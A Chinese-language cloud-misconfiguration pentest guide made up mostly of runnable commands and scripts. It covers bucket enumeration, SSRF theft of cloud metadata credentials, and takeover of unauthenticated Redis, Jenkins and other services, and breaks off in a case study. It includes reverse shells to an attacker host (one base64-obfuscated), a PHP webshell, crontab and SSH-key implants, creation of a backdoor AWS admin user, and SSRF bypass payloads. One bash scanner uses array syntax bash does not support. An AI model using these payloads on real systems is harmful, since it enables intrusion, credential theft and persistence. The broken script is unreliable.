# 云服务配置错误

> **免责声明**：本文档仅供授权的安全测试使用。未经授权对目标系统进行测试可能违反法律法规。请在获得书面授权后进行任何安全测试活动。云服务配置错误可能导致严重的数据泄露，务必谨慎对待获取的数据。

---

## 一、云服务配置错误概述

云服务配置错误（Cloud Misconfiguration）是当前企业面临的最严重的安全风险之一。根据Gartner的预测，到2025年，99%的云安全故障将是客户自身的配置错误造成的。对于安全测试人员而言，云配置错误漏洞往往能直接导致大量数据泄露，是漏洞挖掘中的高价值目标。

### 常见的云配置错误类型

```
1. 存储桶权限配置错误
   - S3 Bucket 公开可读/写
   - 阿里云OSS 公共读/写
   - Azure Blob 匿名访问

2. 云服务元数据泄露
   - SSRF利用元数据接口获取临时凭证
   - 元数据API未做访问控制

3. 无认证的服务实例
   - ElasticSearch 未开启认证
   - MongoDB 未开启认证
   - Redis 未设置密码
   - Jenkins 未开启认证

4. 防火墙/安全组配置错误
   - 端口对外开放范围过大（0.0.0.0/0）
   - 管理端口（22, 3389, 3306等）暴露到公网

5. IAM权限配置错误
   - 过于宽松的角色权限
   - 未使用的IAM用户和权限
   - 跨账户信任配置不当
```

---

## 二、云存储桶检测

### 2.1 AWS S3 存储桶

#### 目录遍历检测

AWS S3存储桶的配置错误是最常见的云安全问题之一。当存储桶配置为公共可读时，任何知道存储桶名称的人都可以枚举其中的文件。

```bash
# 使用AWS CLI检测S3桶权限
# 列出桶内容（需要配置AWS凭证）
aws s3 ls s3://target-bucket/
aws s3 ls s3://target-bucket/ --recursive --no-sign-request

# 使用HTTP直接访问桶
# 列出桶中文件（XML格式）
curl -s https://target-bucket.s3.amazonaws.com/
curl -s https://target-bucket.s3.us-east-1.amazonaws.com/

# 使用AWS CLI检测桶ACL
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request
aws s3api get-bucket-policy --bucket target-bucket --no-sign-request

# 检测桶是否支持公共访问
aws s3api get-public-access-block --bucket target-bucket
```

**批量检测S3桶**：

```bash
#!/bin/bash
# 批量检测S3桶是否可公开访问
buckets=(
    "target-backup"
    "target-data"
    "target-logs"
    "target-assets"
    "target-static"
    "target-media"
    "target-uploads"
    "target-config"
    "target-source"
    "target-dev"
    "target-staging"
    "target-production"
)

for bucket in "${buckets[@]}"; do
    echo "[*] Testing: $bucket"
    
    # 测试公开读
    response=$(curl -s -o /dev/null -w "%{http_code}" "https://$bucket.s3.amazonaws.com/")
    if [ "$response" == "200" ]; then
        echo "[+] PUBLIC READ: $bucket (HTTP $response)"
        echo "[+] Listing files..."
        curl -s "https://$bucket.s3.amazonaws.com/" | grep -oP '<Key>[^<]+</Key>' | head -20
    elif [ "$response" == "403" ]; then
        echo "[-] Access Denied: $bucket"
    elif [ "$response" == "404" ]; then
        echo "[-] Not Found: $bucket"
    fi
    
    # 测试公开写
    echo "test" > /tmp/test.txt
    upload_response=$(curl -s -o /dev/null -w "%{http_code}" \
        -X PUT -d "test" "https://$bucket.s3.amazonaws.com/test_leak_check.txt")
    if [ "$upload_response" == "200" ]; then
        echo "[+] PUBLIC WRITE: $bucket!"
        # 清理测试文件
        aws s3 rm s3://$bucket/test_leak_check.txt --no-sign-request 2>/dev/null
    fi
    
    echo "---"
done
```

#### 文件上传权限测试

```bash
# 测试S3桶的公共写权限
echo "security_test" > test.txt
curl -X PUT -T test.txt "https://target-bucket.s3.amazonaws.com/security_test_$(date +%s).txt"

# 测试跨域配置
curl -s -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET" \
  -X OPTIONS \
  "https://target-bucket.s3.amazonaws.com/"

# 测试目录创建
curl -X PUT "https://target-bucket.s3.amazonaws.com/testdir/"

# 测试覆盖已有对象
curl -X PUT -d "malicious content" \
  "https://target-bucket.s3.amazonaws.com/existing-file.txt"
```

#### 常用Bucket命名规则

```bash
# 基于主域名派生
target.com    -> target, target-backup, target-data
              -> target-bucket, target-storage
              -> target-assets, target-static
              -> target-media, target-uploads
              -> target-dev, target-staging, target-prod

# 基于子域名
api.target.com    -> api.target, api-target
admin.target.com  -> admin.target, admin-target

# 常见命名模式
target-<env>-<type>
target-<region>-<env>
<env>-target-<service>

# 具体示例
target-production-backup
target-us-east-1-data
dev-target-logs
staging-target-database
```

### 2.2 阿里云OSS检测

阿里云OSS（Object Storage Service）的检测方法与AWS S3类似：

```bash
# OSS公开文件列表检测
curl -s https://target-bucket.oss-cn-hangzhou.aliyuncs.com/
curl -s https://target-bucket.oss-cn-beijing.aliyuncs.com/
curl -s https://target-bucket.oss-cn-shenzhen.aliyuncs.com/
curl -s https://target-bucket.oss-cn-shanghai.aliyuncs.com/

# 检测OSS Bucket ACL
curl -s "https://target-bucket.oss-cn-hangzhou.aliyuncs.com/?acl"

# 批量检测OSS Bucket
regions=(
    "oss-cn-hangzhou"
    "oss-cn-beijing"
    "oss-cn-shenzhen"
    "oss-cn-shanghai"
    "oss-cn-hongkong"
    "oss-us-west-1"
    "oss-ap-southeast-1"
)

for region in "${regions[@]}"; do
    response=$(curl -s -o /dev/null -w "%{http_code}" \
        "https://target-bucket.$region.aliyuncs.com/")
    if [ "$response" == "200" ]; then
        echo "[+] PUBLIC READ: target-bucket ($region)"
    fi
done
```

### 2.3 Azure Blob检测

Azure Blob Storage的检测方式有所不同：

```bash
# Azure Blob容器公开访问检测
curl -s https://target.blob.core.windows.net/container/
curl -s https://target.blob.core.windows.net/container?restype=container&comp=list

# 枚举Azure存储账户
# 使用工具如 MicroBurst
git clone https://github.com/NetSPI/MicroBurst.git
cd MicroBurst
Import-Module .\MicroBurst.psm1
Invoke-EnumerateAzureBlobs -Base target

# 手动检测
curl -s "https://target.blob.core.windows.net/?comp=list"
```

### 2.4 公共桶发现工具

```bash
# cloud_enum - 多云存储桶枚举工具
git clone https://github.com/initstring/cloud_enum.git
cd cloud_enum
pip install -r requirements.txt
python3 cloud_enum.py -k target

# S3Scanner - 专门扫描AWS S3
git clone https://github.com/sa7mon/S3Scanner.git
cd S3Scanner
pip install -r requirements.txt
python3 s3scanner.py target-buckets.txt

# lazys3 - 基于字典的S3桶枚举
git clone https://github.com/nahamsec/lazys3.git
cd lazys3
ruby lazys3.rb target

# mass3 - 高速S3桶枚举
git clone https://github.com/smiegles/mass3.git
cd mass3
pip install -r requirements.txt
python3 mass3.py -k target -t 100

# Bucket Stream - 实时S3桶监控
git clone https://github.com/eth0izzle/bucket-stream.git
cd bucket-stream
pip install -r requirements.txt
python3 bucket-stream.py
```

---

## 三、云服务元数据攻击

云服务元数据接口是SSRF攻击的终极目标。当应用存在SSRF漏洞时，攻击者可以通过元数据接口获取云服务器的临时凭证。

### 3.1 AWS元数据服务

```bash
# AWS EC2元数据接口（IMDSv1）
# 基础URL: http://169.254.169.254/latest/meta-data/

# 获取IAM角色名称
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 获取指定角色的临时凭证
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# 获取实例ID
curl http://169.254.169.254/latest/meta-data/instance-id

# 获取实例类型
curl http://169.254.169.254/latest/meta-data/instance-type

# 获取本地IP地址
curl http://169.254.169.254/latest/meta-data/local-ipv4

# 获取公网IP地址
curl http://169.254.169.254/latest/meta-data/public-ipv4

# 获取AMI ID
curl http://169.254.169.254/latest/meta-data/ami-id

# 获取主机名
curl http://169.254.169.254/latest/meta-data/hostname

# 获取安全组信息
curl http://169.254.169.254/latest/meta-data/security-groups

# 获取网络接口信息
curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/

# IMDSv2（需要token）
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/

# 获取完整元数据（JSON格式）
curl http://169.254.169.254/latest/dynamic/instance-identity/document

# 用户数据（启动脚本中常包含敏感信息）
curl http://169.254.169.254/latest/user-data/
```

**获取临时凭证后的利用**：

```bash
# 配置并使用获取的临时凭证
export AWS_ACCESS_KEY_ID=ASIAxxxxxxxxxx
export AWS_SECRET_ACCESS_KEY=xxxxxxxxxxxxxx
export AWS_SESSION_TOKEN=xxxxxxxxxxxxxx

# 检测凭证权限
aws sts get-caller-identity

# 枚举S3桶
aws s3 ls

# 枚举EC2实例
aws ec2 describe-instances --region us-east-1

# 枚举IAM用户
aws iam list-users

# 创建后门用户（如果权限足够）
aws iam create-user --user-name attacker
aws iam attach-user-policy --user-name attacker \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### 3.2 阿里云元数据服务

```bash
# 阿里云元数据接口
# 基础URL: http://100.100.100.200/latest/meta-data/

# 获取实例ID
curl http://100.100.100.200/latest/meta-data/instance-id

# 获取区域信息
curl http://100.100.100.200/latest/meta-data/region-id

# 获取RAM角色名称
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/

# 获取RAM角色临时凭证
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/ROLE_NAME

# 获取实例类型
curl http://100.100.100.200/latest/meta-data/instance-type

# 获取网络信息
curl http://100.100.100.200/latest/meta-data/network/interfaces/macs/

# 获取用户数据（启动脚本）
curl http://100.100.100.200/latest/user-data/

# 获取DNS信息
curl http://100.100.100.200/latest/meta-data/dns-conf/nameservers
```

**阿里云临时凭证利用**：
```bash
# 配置阿里云CLI
aliyun configure set \
  --profile default \
  --mode StsToken \
  --access-key-id STS.xxxxxxxx \
  --access-key-secret xxxxxxxx \
  --sts-token xxxxxxxx \
  --region cn-hangzhou

# 检测权限
aliyun sts:GetCallerIdentity

# 枚举OSS Bucket
aliyun oss ls

# 枚举ECS实例
aliyun ecs DescribeInstances

# 枚举RAM用户
aliyun ram ListUsers
```

### 3.3 GCP元数据服务

```bash
# GCP元数据接口
# 基础URL: http://metadata.google.internal/computeMetadata/v1/
# 注意：GCP要求请求头 Metadata-Flavor: Google

# 获取服务账号信息
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/

# 获取默认服务账号的Token
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# 获取自定义服务账号的Token
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/SERVICE_ACCOUNT_EMAIL/token

# 获取项目ID
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/project/project-id

# 获取实例标签
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/tags

# 获取SSH密钥
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys

# 获取启动脚本
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script

# 获取自定义元数据
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true

# 获取所有可用区域
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/project/attributes/google-compute-default-zone
```

**GCP临时凭证利用**：
```bash
# 安装gcloud CLI
# 配置服务账号认证
export GOOGLE_APPLICATION_CREDENTIALS=token.json

# 利用获取的Token访问GCP资源
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://storage.googleapis.com/storage/v1/b

curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://compute.googleapis.com/compute/v1/projects/PROJECT_ID/zones
```

### 3.4 Azure元数据服务

```bash
# Azure Instance Metadata Service (IMDS)
# 基础URL: http://169.254.169.254/metadata/instance
# 注意：Azure要求请求头 Metadata: true

# 获取实例元数据（JSON格式）
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# 获取计算相关信息
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01"

# 获取网络相关信息
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01"

# 获取托管身份Token
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# 获取特定托管身份的Token
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net&client_id=CLIENT_ID"
```

**Azure托管身份利用**：
```bash
# 使用获取的Token访问Azure资源
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://management.azure.com/subscriptions?api-version=2020-01-01

# 访问Key Vault
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://vault-name.vault.azure.net/secrets?api-version=2016-10-01
```

### 3.5 SSRF配合元数据攻击实战

```bash
# 利用SSRF漏洞获取云元数据（多种绕过方式）

# 直接访问
http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/

# DNS重绑定
http://target.com/proxy?url=http://169.254.169.254.xip.io/latest/meta-data/

# 使用十进制IP（转换后）
http://target.com/proxy?url=http://2852039166/latest/meta-data/

# CDN绕过
http://target.com/proxy?url=http://instance-data/latest/meta-data/

# 使用AWS内部DNS
http://target.com/proxy?url=http://instance-data.ec2.internal/latest/meta-data/

# 使用@符号绕过
http://target.com/proxy?url=http://169.254.169.254@evil.com/
http://target.com/proxy?url=http://evil.com@169.254.169.254/

# 使用302跳转
# 1. 在攻击者服务器上创建302跳转
# 2. 触发SSRF到攻击者服务器
http://target.com/proxy?url=http://attacker.com/redirect
# 3. 302跳转到http://169.254.169.254/latest/meta-data/

# 使用IPv6地址
http://target.com/proxy?url=http://[::ffff:169.254.169.254]/latest/meta-data/

# 协议绕过（使用file://）
http://target.com/proxy?url=file:///proc/1/environ
```

---

## 四、云服务配置泄露检测

### 4.1 Firebase数据库未授权

Firebase是Google的移动端BaaS服务，经常出现数据库规则配置错误：

```bash
# 检测Firebase数据库是否可公开访问
# Firebase数据库URL格式: https://<project-id>.firebaseio.com/

# 读取数据库（未授权）
curl -s "https://target.firebaseio.com/.json"
curl -s "https://target-default-rtdb.firebaseio.com/.json"
curl -s "https://target-default-rtdb.asia-southeast1.firebasedatabase.app/.json"

# 写入数据库
curl -X PUT -d '{"test":"security_check"}' \
  "https://target.firebaseio.com/security_check.json"

# 删除数据
curl -X DELETE "https://target.firebaseio.com/security_check.json"

# 自动发现工具
git clone https://github.com/Turistforeningen/firebase-scanner.git
cd firebase-scanner
npm install
node scanner.js target-project-id

# Firebase配置泄露（API Key等）
# 常见在应用的google-services.json或GoogleService-Info.plist中
# 搜索Firebase配置
```

**检测脚本**：
```python
#!/usr/bin/env python3
import requests
import sys

def check_firebase(project_id):
    urls = [
        f"https://{project_id}.firebaseio.com/.json",
        f"https://{project_id}.firebaseio.com/.json?shallow=true",
        f"https://{project_id}-default-rtdb.firebaseio.com/.json",
        f"https://{project_id}-default-rtdb.firebaseio.com/.json?shallow=true",
    ]
    
    for url in urls:
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200 and r.text != "null":
                print(f"[+] FIREBASE OPEN: {url}")
                print(f"[+] Data preview: {r.text[:500]}")
                return True
            elif r.status_code == 401:
                print(f"[-] Firebase requires auth: {url}")
            else:
                print(f"[-] Status {r.status_code}: {url}")
        except Exception as e:
            print(f"[!] Error: {e}")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 check_firebase.py <project-id>")
        sys.exit(1)
    check_firebase(sys.argv[1])
```

### 4.2 ElasticSearch未授权

未加认证的ElasticSearch是数据泄露的常见来源：

```bash
# 检测ElasticSearch未授权访问
curl -s "http://target.com:9200/"
curl -s "https://target.com:9200/"

# 获取集群健康状态
curl -s "http://target.com:9200/_cluster/health?pretty"

# 列出所有索引
curl -s "http://target.com:9200/_cat/indices?v"

# 查看索引映射
curl -s "http://target.com:9200/_mapping?pretty"

# 搜索所有数据
curl -s "http://target.com:9200/_search?pretty" -d '{"query": {"match_all": {}}}'

# 搜索特定字段
curl -s "http://target.com:9200/_search?pretty" -d '{
  "query": {
    "match": {
      "password": ""
    }
  }
}'

# 获取索引统计
curl -s "http://target.com:9200/_stats?pretty"

# 复制索引数据（如果可写）
curl -s -X POST "http://target.com:9200/_reindex" -d '{
  "source": {"index": "users"},
  "dest": {"index": "users_backup"}
}'

# 批量检测
nmap -p 9200,9300 -Pn --open target.com
# 或使用Shodan搜索
# shodan search "port:9200 org:\"target\""
# shodan search "elastic port:9200 country:CN"
```

### 4.3 MongoDB未授权

MongoDB默认配置不开启认证，容易被利用：

```bash
# 检测MongoDB未授权
mongosh mongodb://target.com:27017

# 列出数据库
mongosh mongodb://target.com:27017 --eval "show dbs"

# 列出集合
mongosh mongodb://target.com:27017/targetdb --eval "show collections"

# 导出用户数据
mongosh mongodb://target.com:27017/targetdb --eval "db.users.find().pretty()"

# 检测是否存在admin数据库
mongosh mongodb://target.com:27017/admin --eval "show collections"

# 使用nmap扫描
nmap -p 27017 --script mongodb-databases --script-args mongodb.auth="" target.com

# 批量检测MongoDB
# 使用masscan快速扫描
masscan -p27017 --rate=10000 0.0.0.0/0 --output-format json -oM mongodb.json

# 使用Shodan
# shodan search "mongodb port:27017 country:CN"
```

### 4.4 Redis未授权

Redis未授权可能导致服务器被完全控制：

```bash
# 检测Redis未授权
redis-cli -h target.com -p 6379

# 获取Redis信息
redis-cli -h target.com -p 6379 INFO
redis-cli -h target.com -p 6379 CONFIG GET *

# 获取所有键
redis-cli -h target.com -p 6379 KEYS "*"

# 读取敏感数据
redis-cli -h target.com -p 6379 GET "session:admin"
redis-cli -h target.com -p 6379 LRANGE "user_list" 0 -1

# 利用Redis写SSH密钥（如果以root运行）
redis-cli -h target.com -p 6379 CONFIG SET dir /root/.ssh/
redis-cli -h target.com -p 6379 CONFIG SET dbfilename authorized_keys
redis-cli -h target.com -p 6379 SET ssh_key "ssh-rsa AAAAB3NzaC1yc2E..."
redis-cli -h target.com -p 6379 SAVE

# 利用Redis写Crontab
redis-cli -h target.com -p 6379 CONFIG SET dir /var/spool/cron/
redis-cli -h target.com -p 6379 CONFIG SET dbfilename root
redis-cli -h target.com -p 6379 SET cron "* * * * * bash -i >& /dev/tcp/attacker/4444 0>&1"
redis-cli -h target.com -p 6379 SAVE

# WebShell写入
redis-cli -h target.com -p 6379 CONFIG SET dir /var/www/html/
redis-cli -h target.com -p 6379 CONFIG SET dbfilename shell.php
redis-cli -h target.com -p 6379 SET web "<?php system($_GET['cmd']); ?>"
redis-cli -h target.com -p 6379 SAVE

# 检测是否是集群
redis-cli -h target.com -p 6379 CLUSTER INFO

# 批量扫描
masscan -p6379 --rate=10000 0.0.0.0/0 --output-format json -oM redis.json
```

### 4.5 Jenkins未授权

Jenkins未授权访问可能导致代码执行：

```bash
# 检测Jenkins未授权
curl -s "http://target.com:8080/"
curl -s "http://target.com:8080/script"

# 检查Jenkins脚本控制台（可执行Groovy脚本）
curl -s "http://target.com:8080/script" | grep -i "script"

# 利用脚本控制台执行系统命令
curl -s -X POST "http://target.com:8080/scriptText" \
  -d "script=println 'id'.execute().text"

# 执行反弹Shell
curl -s -X POST "http://target.com:8080/scriptText" \
  -d 'script=Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}")'

# 获取Jenkins系统信息
curl -s "http://target.com:8080/api/json" 

# 查看构建日志（可能包含凭证）
curl -s "http://target.com:8080/job/project/lastBuild/consoleText"

# 获取Job配置（可能包含密码）
curl -s "http://target.com:8080/job/project/config.xml"

# 列举所有Job
curl -s "http://target.com:8080/api/json?pretty=true"

# Shodan搜索
# shodan search "x-jenkins port:8080"
# shodan search "Jenkins x-hudson"
```

### 4.6 其他常见未授权服务

```bash
# Kibana未授权
curl -s "http://target.com:5601/api/status"
curl -s "http://target.com:5601/api/saved_objects/_find?type=index-pattern"

# Grafana未授权
curl -s "http://target.com:3000/api/search"
curl -s "http://target.com:3000/api/dashboards"

# Prometheus未授权
curl -s "http://target.com:9090/api/v1/targets"
curl -s "http://target.com:9090/api/v1/query?query=up"

# Consul未授权
curl -s "http://target.com:8500/v1/agent/members"
curl -s "http://target.com:8500/v1/kv/?keys"

# RabbitMQ未授权
curl -s "http://target.com:15672/api/overview"  # 默认guest/guest

# Hadoop YARN未授权
curl -s "http://target.com:8088/ws/v1/cluster/apps"

# Docker未授权API
curl -s "http://target.com:2375/version"
curl -s "http://target.com:2375/containers/json"

# Kubernetes API未授权
curl -s "https://target.com:6443/api/v1/namespaces/default/pods"
curl -s "https://target.com:6443/api/v1/nodes"
```

---

## 五、扫描方法

### 5.1 批量检测存储桶

```bash
#!/bin/bash
# 批量云存储桶检测脚本

TARGET="target"
declare -A providers

# AWS S3
providers["AWS"]=(
    "s3.amazonaws.com"
    "s3.us-east-1.amazonaws.com"
    "s3.us-west-1.amazonaws.com"
    "s3.eu-west-1.amazonaws.com"
    "s3.ap-northeast-1.amazonaws.com"
)

# 阿里云OSS
providers["Aliyun"]=(
    "oss-cn-hangzhou.aliyuncs.com"
    "oss-cn-beijing.aliyuncs.com"
    "oss-cn-shenzhen.aliyuncs.com"
    "oss-cn-shanghai.aliyuncs.com"
    "oss-cn-hongkong.aliyuncs.com"
)

# Bucket名称字典
names=(
    "${TARGET}"
    "${TARGET}-backup"
    "${TARGET}-data"
    "${TARGET}-log"
    "${TARGET}-logs"
    "${TARGET}-static"
    "${TARGET}-assets"
    "${TARGET}-media"
    "${TARGET}-uploads"
    "${TARGET}-config"
    "${TARGET}-configs"
    "${TARGET}-dev"
    "${TARGET}-devops"
    "${TARGET}-staging"
    "${TARGET}-stage"
    "${TARGET}-prod"
    "${TARGET}-production"
    "${TARGET}-test"
    "${TARGET}-testing"
    "${TARGET}-src"
    "${TARGET}-source"
    "${TARGET}-release"
    "${TARGET}-resources"
    "${TARGET}-public"
    "${TARGET}-private"
    "${TARGET}-internal"
    "${TARGET}-download"
    "${TARGET}-cdn"
    "dev.${TARGET}"
    "test.${TARGET}"
    "cdn.${TARGET}"
    "static.${TARGET}"
    "images.${TARGET}"
    "backup.${TARGET}"
    "download.${TARGET}"
)

for provider in "${!providers[@]}"; do
    echo "[*] Checking $provider..."
    eval "endpoints=(\"\${${provider}[@]}\")"
    for name in "${names[@]}"; do
        for endpoint in "${endpoints[@]}"; do
            url="https://${name}.${endpoint}/"
            status=$(curl -s -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
            if [ "$status" == "200" ] || [ "$status" == "301" ] || [ "$status" == "403" ]; then
                echo "[+] $url -> HTTP $status"
            fi
        done
    done
done
```

### 5.2 使用专业工具

```bash
# cloud_enum - 多平台云资源枚举
git clone https://github.com/initstring/cloud_enum.git
cd cloud_enum
pip3 install -r requirements.txt

# 基础扫描
python3 cloud_enum.py -k target -k target.com \
  --s3 - --oss --blob --gcs

# 使用自定义字典
python3 cloud_enum.py -k target -k target.com \
  --s3 -k test --s3 -k dev --s3 -k prod \
  -k backup -k static -k logs \
  --oss --blob --gcs

# 指定AWS区域
python3 cloud_enum.py -k target \
  --s3-regions us-east-1,us-west-2,eu-west-1

# 输出结果到文件
python3 cloud_enum.py -k target -k target.com \
  --s3 --oss --blob -o results.txt

# 使用密钥文件（AWS Key）
python3 cloud_enum.py -k target \
  --access-key AKIAxxxx --secret-key xxxx
```

```bash
# S3Scanner - AWS S3专用扫描
git clone https://github.com/sa7mon/S3Scanner.git
cd S3Scanner

# 准备待检测的桶名称列表
echo "target" > buckets.txt
echo "target-backup" >> buckets.txt
echo "target-data" >> buckets.txt

# 扫描
python3 s3scanner.py buckets.txt

# 详细输出
python3 s3scanner.py buckets.txt --verbose

# 检查是否可写
python3 s3scanner.py buckets.txt --check-write

# 使用线程提高速度
python3 s3scanner.py buckets.txt --threads 50
```

```bash
# GCPBucketBrute - GCP存储桶枚举
git clone https://github.com/RhinoSecurityLabs/GCPBucketBrute.git
cd GCPBucketBrute
python3 gcpbucketbrute.py -k target -u
```

### 5.3 OSINT方法

```bash
# 使用Google搜索发现公开桶
site:s3.amazonaws.com "target"
site:oss-cn-hangzhou.aliyuncs.com "target"
site:blob.core.windows.net "target"
site:storage.googleapis.com "target"

# 使用Shodan发现云服务
# 需要Shodan API Key
shodan search "target" "port:9200"  # ElasticSearch
shodan search "target" "port:27017" # MongoDB
shodan search "target" "port:6379"  # Redis
shodan search "target" "port:8088"  # YARN
shodan search "target" "port:8080"  # Jenkins
shodan search "target" "x-jenkins"  # Jenkins
shodan search "target" "kibana"     # Kibana
shodan search "target" "grafana"    # Grafana
shodan search "target" "prometheus" # Prometheus

# 使用Censys搜索
# https://search.censys.io/
# 搜索：services.service_name: "ELASTICSEARCH" AND labels: "target"
# 搜索：services.service_name: "MONGODB" AND labels: "target"

# 使用FOFA搜索（国内常用）
# https://fofa.info/
# app="Elasticsearch" && body="target"
# app="MongoDB" && body="target"
```

### 5.4 利用公开数据集

```bash
# 使用GrayHatWarfare（公开S3桶数据库）
# https://buckets.grayhatwarfare.com/
# 搜索关键词：target
curl "https://buckets.grayhatwarfare.com/api/buckets/keyword/target"

# 使用PublicBucket的S3数据集
# https://github.com/initstring/cloud_enum
# 该工具内置了常用桶名称字典

# DNS数据集
# 使用Certificate Transparency logs发现云服务域名
curl -s "https://crt.sh/?q=%25.target.com%25&output=json" | jq -r '.[].name_value'

# SecurityTrails API
curl -s "https://api.securitytrails.com/v1/domain/target.com/subdomains" \
  -H "APIKEY: ${API_KEY}"

# VirusTotal
# https://www.virustotal.com/ui/domains/target.com/subdomains
```

### 5.5 自动化扫描框架

```python
#!/usr/bin/env python3
"""
云服务配置错误自动扫描框架
"""

import requests
import json
import concurrent.futures
import sys
from urllib.parse import urlparse

class CloudMisconfigScanner:
    def __init__(self, target):
        self.target = target
        self.results = {
            "storage_buckets": [],
            "unsecured_services": [],
            "metadata_accessible": []
        }
        self.timeout = 5

    def scan_s3_buckets(self):
        """扫描AWS S3桶"""
        names = [
            self.target,
            f"{self.target}-backup",
            f"{self.target}-data",
            f"{self.target}-logs",
            f"{self.target}-static",
            f"{self.target}-uploads",
            f"{self.target}-dev",
            f"{self.target}-staging",
            f"{self.target}-prod",
            f"dev.{self.target}",
            f"cdn.{self.target}",
            f"static.{self.target}",
            f"backup.{self.target}"
        ]
        
        regions = [
            "s3.amazonaws.com",
            "s3.us-east-1.amazonaws.com",
            "s3.us-west-2.amazonaws.com",
            "s3.eu-west-1.amazonaws.com",
            "s3.ap-southeast-1.amazonaws.com"
        ]

        for name in names:
            for region in regions:
                url = f"https://{name}.{region}/"
                try:
                    r = requests.get(url, timeout=self.timeout)
                    if r.status_code == 200:
                        # 尝试列出文件
                        if r.headers.get("content-type", "").startswith("application/xml"):
                            self.results["storage_buckets"].append({
                                "provider": "AWS S3",
                                "url": url,
                                "status": "PUBLIC_READ",
                                "response_sample": r.text[:500]
                            })
                    elif r.status_code == 403:
                        self.results["storage_buckets"].append({
                            "provider": "AWS S3",
                            "url": url,
                            "status": "EXISTS_BUT_RESTRICTED"
                        })
                except requests.exceptions.RequestException:
                    pass

    def scan_unsecured_services(self):
        """扫描常见未授权服务"""
        services = {
            "ElasticSearch": [
                ("http", 9200, "/"),
                ("https", 9200, "/"),
            ],
            "MongoDB": [
                ("http", 27017, "/"),
            ],
            "Jenkins": [
                ("http", 8080, "/api/json"),
                ("https", 8080, "/api/json"),
            ],
            "Kibana": [
                ("http", 5601, "/api/status"),
                ("https", 5601, "/api/status"),
            ],
            "Prometheus": [
                ("http", 9090, "/api/v1/targets"),
                ("https", 9090, "/api/v1/targets"),
            ],
            "Docker": [
                ("http", 2375, "/version"),
                ("https", 2376, "/version"),
            ],
            "Redis": [
                ("http", 6379, "/"),
            ],
            "Grafana": [
                ("http", 3000, "/api/search"),
                ("https", 3000, "/api/search"),
            ]
        }

        def check_service(service_name, protocol, port, path):
            url = f"{protocol}://{self.target}:{port}{path}"
            try:
                r = requests.get(url, timeout=self.timeout, verify=False)
                if r.status_code in [200, 201, 401, 403]:
                    self.results["unsecured_services"].append({
                        "service": service_name,
                        "url": url,
                        "status_code": r.status_code,
                        "response_sample": r.text[:200]
                    })
                    return True
            except (requests.exceptions.RequestException, 
                    requests.exceptions.ConnectionError):
                pass
            return False

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for service_name, endpoints in services.items():
                for protocol, port, path in endpoints:
                    future = executor.submit(
                        check_service, service_name, protocol, port, path
                    )
                    futures.append(future)
            concurrent.futures.wait(futures)

    def run(self):
        """执行完整扫描"""
        print(f"[*] Starting scan for: {self.target}")
        
        print("[*] Scanning S3 buckets...")
        self.scan_s3_buckets()
        
        print("[*] Scanning unsecured services...")
        self.scan_unsecured_services()
        
        # 输出报告
        print("\n" + "="*60)
        print("SCAN RESULTS")
        print("="*60)
        print(json.dumps(self.results, indent=2, ensure_ascii=False))
        
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 scanner.py <target-domain>")
        sys.exit(1)
    
    scanner = CloudMisconfigScanner(sys.argv[1])
    scanner.run()
```

---

## 六、实战案例

### 案例 1：AWS S3桶泄露千万条用户数据

**发现过程**：
1. 目标是一家知名互联网公司，主域名为 `example.com`
2. 使用 `cloud_enum` 枚举发现 `example-backup.s3.amazonaws.com` 可公开访问
3. 访问桶URL，看到完整的目录列表
4. 下载所有文件，发现包含全量用户数据的SQL备份
5. 数据包含用户名、手机号、邮箱、加密密码、地址等

**影响**：超过1000万用户数据泄露，公司被罚款并承担法律责任

### 案例 2：阿里云OSS配置错误泄露企业内部文档

**发现过程**：
1. 通过Google搜索 `site:oss-cn-hangzhou.aliyuncs.com "target"` 找到公开桶
2. 桶中存放了企业内部系统的截图和配置文件
